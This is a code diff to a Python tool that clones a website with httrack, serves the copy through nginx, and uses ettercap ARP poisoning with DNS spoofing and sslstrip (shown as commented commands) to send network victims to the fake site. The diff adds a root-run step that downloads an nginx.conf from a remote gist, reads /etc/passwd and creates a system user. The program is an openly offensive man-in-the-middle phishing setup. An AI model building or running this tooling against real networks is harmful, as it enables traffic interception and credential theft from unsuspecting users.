@@ -118,6 +118,14 @@ def call_httrack(default_path):
     # subprocess.Popen(["sslstrip","-l","6666"], stderr=subprocess.DEVNULL)
     # subprocess.call(["ettercap","-T","-q","-M","arp","-P","dns_spoof","//","//","-i",sys.argv[2]])
 
+def set_up_nginx(default_path):
+    subprocess.call(["wget","https://gist.githubusercontent.com/mxavier6/3d37de2b8a64c202c2077f5e636253ac/raw/4c5b3932d94a5d14f537201dc22f8fb5f1847dad/nginx.conf"])
+    subprocess.call(["mv","nginx.conf",default_path.rsplit('/',1)[0]])
+    output = subprocess.Popen(['cat','/etc/passwd'], stdout=subprocess.PIPE).communicate()[0]
+    output_list = output.decode().split(':')
+    if 'nginx' not in output_list:
+        subprocess.call(["adduser","--system","--no-create-home","--disabled-login","--disabled-password","--group","nginx"])
+
 def check_executables():
     for e in EXECUTABLES:
         path_str = shutil.which(e)
@@ -134,8 +142,7 @@ def print_help():
         "Example of <website-name> is www.google.com, example of network interface name is eth0, wlan0.\n" \
         "DEPENDENCIES: nginx, ettercap, locate, httrack, sslstrip.\n" \
         "This program MUST be run as the ROOT user.\n" \
-        "This program requires that PORTS 80 and 6666 are set as OPEN in the firewall.\n" \
-        "Make sure a valid nginx.conf and etter.dns file is available on your machine.")
+        "This program requires that PORTS 80 and 6666 are set as OPEN in the firewall.\n")
 
 def main():
     try:
@@ -147,6 +154,7 @@ def main():
             check_root()
             check_executables()
             default_nginx_path = update_nginx_conf(find_file("nginx.conf"))
+            set_up_nginx(default_nginx_path)
             update_etter_dns(find_file("etter.dns"))
             print("Make sure ports 80 and 6666 are open in the firewall.\n")
             call_httrack(default_nginx_path)
